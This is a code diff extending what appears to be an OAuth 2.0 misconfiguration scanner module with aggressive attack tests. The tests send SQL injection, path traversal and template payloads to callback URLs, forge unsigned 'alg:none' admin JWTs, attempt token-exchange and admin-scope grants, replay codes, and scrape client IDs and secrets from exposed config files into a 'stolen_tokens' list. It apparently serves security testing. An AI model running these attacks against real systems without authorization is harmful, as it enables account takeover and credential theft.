@@ -1,12 +1,16 @@
 import re
+import json
+import hashlib
+import base64
 from urllib.parse import urlparse, parse_qs, urlencode, urljoin
 from modules.base import BaseModule
 from core.utils import random_string
- 
+
 
 class OauthModule(BaseModule):
     name = "oauth"
     description = "OAuth 2.0 Misconfiguration Scanner"
+    exploitable = True
     
     oauth_endpoints = [
         "/oauth/authorize", "/oauth/auth", "/oauth2/authorize", "/oauth2/auth",
@@ -27,6 +31,7 @@ class OauthModule(BaseModule):
     
     async def scan(self, target):
         self.findings = []
+        self.stolen_tokens = []
         base_url = self._get_base_url(target)
         
         oauth_urls = await self._discover_oauth_endpoints(base_url)
@@ -37,10 +42,188 @@ class OauthModule(BaseModule):
             await self._test_scope_escalation(oauth_url)
             await self._test_token_leakage(oauth_url)
             await self._test_pkce_bypass(oauth_url)
+            await self._test_id_token_substitution(oauth_url)
+            await self._test_token_replay(oauth_url)
+            
+            if self.aggressive:
+                await self._test_authorization_code_injection(oauth_url)
+                await self._test_client_credential_leak(oauth_url, base_url)
+                await self._test_token_exchange_attack(oauth_url, base_url)
+                await self._test_nonce_reuse(oauth_url)
         
         await self._test_token_exposure(target)
         
         return self.findings
+    
+    async def _test_authorization_code_injection(self, oauth_url):
+        parsed = urlparse(oauth_url)
+        base = f"{parsed.scheme}://{parsed.netloc}"
+        
+        callback_urls = [
+            f"{base}/callback",
+            f"{base}/oauth/callback", 
+            f"{base}/auth/callback",
+            f"{base}/login/callback",
+        ]
+        
+        malicious_codes = [
+            "injected_code_12345",
+            "' OR '1'='1",
+            "admin_code",
+            "../../../etc/passwd",
+            "${7*7}",
+        ]
+        
+        for callback in callback_urls:
+            for code in malicious_codes:
+                test_url = f"{callback}?code={code}&state=test123"
+                resp = await self.http.get(test_url, allow_redirects=False)
+                
+                if resp.get("status") in [200, 302]:
+                    text = resp.get("text", "").lower()
+                    location = resp.get("headers", {}).get("location", "").lower()
+                    
+                    if "access_token" in text or "access_token" in location:
+                        self.add_finding(
+                            "CRITICAL",
+                            "OAuth Authorization Code Injection",
+                            url=callback,
+                            evidence=f"Injected code '{code}' accepted",
+                            confidence_evidence=["code_injection", "token_obtained"],
+                            request_data={"method": "GET", "url": test_url}
+                        )
+                        return
+                    
+                    if resp.get("status") == 200 and "error" not in text:
+                        self.add_finding(
+                            "HIGH",
+                            "OAuth Callback Accepts Arbitrary Code",
+                            url=callback,
+                            evidence=f"Code '{code}' not rejected",
+                            confidence_evidence=["code_not_validated"],
+                            request_data={"method": "GET", "url": test_url}
+                        )
+    
+    async def _test_client_credential_leak(self, oauth_url, base_url):
+        leak_paths = [
+            "/.well-known/oauth-authorization-server",
+            "/oauth/clients",
+            "/api/oauth/applications",
+            "/admin/oauth/clients",
+            "/.git/config",
+            "/config.js",
+            "/static/js/main.js",
+            "/app.js",
+        ]
+        
+        for path in leak_paths:
+            url = urljoin(base_url, path)
+            resp = await self.http.get(url)
+            
+            if resp.get("status") == 200:
+                text = resp.get("text", "")
+                
+                client_id_pattern = r'client[_-]?id["\s:=]+([a-zA-Z0-9_-]{10,})'
+                client_secret_pattern = r'client[_-]?secret["\s:=]+([a-zA-Z0-9_-]{10,})'
+                
+                id_match = re.search(client_id_pattern, text, re.I)
+                secret_match = re.search(client_secret_pattern, text, re.I)
+                
+                if id_match and secret_match:
+                    self.add_finding(
+                        "CRITICAL",
+                        "OAuth Client Credentials Exposed",
+                        url=url,
+                        evidence=f"Client ID: {id_match.group(1)[:10]}..., Secret found",
+                        confidence_evidence=["client_secret_leaked", "credentials_exposed"],
+                        request_data={"method": "GET", "url": url}
+                    )
+                    self.stolen_tokens.append({
+                        "type": "client_credentials",
+                        "client_id": id_match.group(1),
+                        "client_secret": secret_match.group(1)[:20] + "..."
+                    })
+                    return
+    
+    async def _test_token_exchange_attack(self, oauth_url, base_url):
+        token_url = oauth_url.replace("/authorize", "/token").replace("/auth", "/token")
+        
+        exchange_payloads = [
+            {
+                "grant_type": "urn:ietf:params:oauth:grant-type:token-exchange",
+                "subject_token": "eyJhbGciOiJub25lIn0.eyJzdWIiOiJhZG1pbiJ9.",
+                "subject_token_type": "urn:ietf:params:oauth:token-type:access_token",
+            },
+            {
+                "grant_type": "urn:ietf:params:oauth:grant-type:jwt-bearer",
+                "assertion": "eyJhbGciOiJub25lIn0.eyJzdWIiOiJhZG1pbiJ9.",
+            },
+            {
+                "grant_type": "client_credentials",
+                "scope": "admin",
+            },
+        ]
+        
+        for payload in exchange_payloads:
+            resp = await self.http.post(
+                token_url,
+                data=payload,
+                headers={"Content-Type": "application/x-www-form-urlencoded"}
+            )
+            
+            if resp.get("status") == 200:
+                try:
+                    data = json.loads(resp.get("text", "{}"))
+                    if data.get("access_token"):
+                        self.add_finding(
+                            "CRITICAL",
+                            f"OAuth Token Exchange Attack Successful",
+                            url=token_url,
+                            evidence=f"Grant type: {payload.get('grant_type')}",
+                            confidence_evidence=["token_exchange_bypass", "token_obtained"],
+                            request_data={"method": "POST", "url": token_url, "grant_type": payload.get("grant_type")}
+                        )
+                        self.stolen_tokens.append({
+                            "type": "token_exchange",
+                            "access_token": data.get("access_token")[:20] + "..."
+                        })
+                        return
+                except:
+                    pass
+    
+    async def _test_nonce_reuse(self, oauth_url):
+        fixed_nonce = "fixed_nonce_12345"
+        
+        params = {
+            "client_id": "test_client",
+            "redirect_uri": "https://target.com/callback",
+            "response_type": "id_token",
+            "scope": "openid",
+            "state": random_string(16),
+            "nonce": fixed_nonce,
+        }
+        
+        test_url = f"{oauth_url}?{urlencode(params)}"
+        
+        resp1 = await self.http.get(test_url, allow_redirects=False)
+        resp2 = await self.http.get(test_url, allow_redirects=False)
+        
+        if resp1.get("status") in [302, 303] and resp2.get("status") in [302, 303]:
+            loc1 = resp1.get("headers", {}).get("location", "")
+            loc2 = resp2.get("headers", {}).get("location", "")
+            
+            if "id_token=" in loc1 and "id_token=" in loc2:
+                token1 = re.search(r'id_token=([^&]+)', loc1)
+                token2 = re.search(r'id_token=([^&]+)', loc2)
+                
+                if token1 and token2 and token1.group(1) == token2.group(1):
+                    self.add_finding(
+                        "HIGH",
+                        "OAuth Nonce Reuse - Token Replay Possible",
+                        url=oauth_url,
+                        evidence="Same nonce produces identical id_tokens",
+                        confidence_evidence=["nonce_reuse", "replay_attack_possible"]
+                    )
     
     def _get_base_url(self, url):
         parsed = urlparse(url)
@@ -262,6 +445,82 @@ class OauthModule(BaseModule):
                     evidence="Authorization proceeds without PKCE"
                 )
     
+    async def _test_id_token_substitution(self, oauth_url):
+        fake_id_tokens = [
+            "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsImVtYWlsIjoiYWRtaW5AZXhhbXBsZS5jb20iLCJyb2xlIjoiYWRtaW4ifQ.",
+            "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiJ9.x",
+        ]
+        for token in fake_id_tokens:
+            resp = await self.http.get(
+                oauth_url,
+                headers={"Authorization": f"Bearer {token}", "X-ID-Token": token}
+            )
+            if resp.get("status") == 200:
+                text = (resp.get("text") or "").lower()
+                if "admin" in text or "dashboard" in text or "welcome" in text:
+                    if "invalid" not in text and "error" not in text:
+                        self.add_finding(
+                            "CRITICAL",
+                            "OAuth ID token substitution / forgery accepted",
+                            url=oauth_url,
+                            evidence="Fake/signed id_token accepted"
+                        )
+                        return
+            resp = await self.http.post(
+                oauth_url.replace("/authorize", "/token").replace("/auth", "/token"),
+                data={"id_token": token, "grant_type": "implicit"},
+                headers={"Content-Type": "application/x-www-form-urlencoded"}
+            )
+            if resp.get("status") in [200, 201]:
+                try:
+                    import json
+                    data = json.loads(resp.get("text", "{}"))
+                    if data.get("access_token") or data.get("id_token"):
+                        self.add_finding(
+                            "CRITICAL",
+                            "OAuth token endpoint accepts forged id_token",
+                            url=oauth_url,
+                            evidence="Token issued for substituted id_token"
+                        )
+                        return
+                except Exception:
+                    pass
+
+    async def _test_token_replay(self, oauth_url):
+        parsed = urlparse(oauth_url)
+        base = f"{parsed.scheme}://{parsed.netloc}"
+        token_urls = [
+            urljoin(base, "/oauth/token"),
+            urljoin(base, "/oauth2/token"),
+            urljoin(base, "/token"),
+            urljoin(base, "/api/oauth/token"),
+        ]
+        replay_payloads = [
+            {"grant_type": "authorization_code", "code": "reused_code_123", "redirect_uri": "https://client.example/cb"},
+            {"grant_type": "refresh_token", "refresh_token": "stolen_refresh_token"},
+        ]
+        for token_url in token_urls:
+            for payload in replay_payloads:
+                r1 = await self.http.post(token_url, data=payload)
+                if r1.get("status") not in [200, 201]:
+                    continue
+                r2 = await self.http.post(token_url, data=payload)
+                if r2.get("status") in [200, 201]:
+                    try:
+                        import json
+                        d1 = json.loads(r1.get("text", "{}"))
+                        d2 = json.loads(r2.get("text", "{}"))
+                        if d1.get("access_token") and d2.get("access_token") and d1.get("access_token") == d2.get("access_token"):
+                            self.add_finding(
+                                "HIGH",
+                                "OAuth token replay: same token issued twice",
+                                url=token_url,
+                                evidence="Authorization code or refresh token reused without invalidation"
+                            )
+                            return
+                    except Exception:
+                        pass
+
     async def _test_token_exposure(self, target):
         resp = await self.http.get(target)
         
